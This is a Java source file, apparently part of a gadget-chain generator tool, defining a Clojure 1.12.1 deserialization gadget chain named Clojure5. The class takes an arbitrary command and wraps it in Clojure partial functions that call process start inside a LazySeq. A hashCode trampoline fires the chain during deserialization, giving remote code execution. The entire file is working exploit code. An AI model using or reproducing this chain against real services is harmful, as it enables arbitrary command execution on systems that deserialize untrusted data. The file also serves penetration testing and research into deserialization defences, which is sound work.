package org.ses.gadgetbuilder.chains1;

import clojure.core$partial$fn__5929;
import clojure.core$partial$fn__5931;
import clojure.core$partial$fn__5933;
import clojure.java.process$start;
import clojure.lang.IFn;
import clojure.lang.LazySeq;
import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.annotations.Dependencies;
import org.ses.gadgetbuilder.annotations.Impact;
import org.ses.gadgetbuilder.chains.main.GadgetChain;
import org.ses.gadgetbuilder.chains.main.TrampolineConnector;
import org.ses.gadgetbuilder.chains.trampolines.noparam.HashCodeTrampoline;

/**
 * Variant of https://hackmd.io/@fe1w0/HyefvRQKp using LazySeq
 * Adapted to recent Clojure version
 */
@Authors({Authors.FE1W0,Authors.BK})
@Impact(Impact.RCE)
@Dependencies({"org.clojure:clojure:1.12.1"})
public class Clojure5 extends GadgetChain<HashCodeTrampoline> {
    public Clojure5(HashCodeTrampoline _trampoline) {
        super(_trampoline);
    }

    @Override
    protected TrampolineConnector createPayload(String command) throws Exception {

        process$start p_start = new process$start();
        String[] commandArr = command.split(" ");
        IFn core = null;

        switch (commandArr.length) {
            case 1:
                core = new core$partial$fn__5929(commandArr[0], p_start);
                break;
            case 2:
                core = new core$partial$fn__5931(commandArr[0], commandArr[1], p_start);
                break;
            case 3:
                core = new core$partial$fn__5933(commandArr[0], p_start, commandArr[1], commandArr[2]);
                break;
        }

        LazySeq seq = new LazySeq(core);

        return new TrampolineConnector(seq);
    }

    @Override
    protected void postProcessPayload() throws Exception {
    }

}
